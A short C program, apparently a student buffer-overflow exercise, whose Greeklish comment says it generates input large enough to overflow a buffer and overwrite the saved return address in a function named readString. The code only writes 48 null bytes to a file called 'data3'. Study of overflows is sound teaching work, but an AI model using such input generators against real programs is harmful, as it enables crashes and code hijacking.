#include<stdio.h>
#define NLOOPS 48

/*H arxh leitoyrgias toy programmatos einai
 *dhmioyrgei katallhla megalo input oste na
 *ginei buffer overflow kai na xtypisei tin 
 *return address poy einai sosmenh sto  
 *stack frame tis readString.
 *
*/
int main(){
	int i;
	FILE *data_out;
	char c='\0';
	data_out=fopen("data3","w+");
	for(i=0;i<NLOOPS;i++){
		fprintf(data_out,"%c",c);
	}
	fclose(data_out);
	return 0;
}
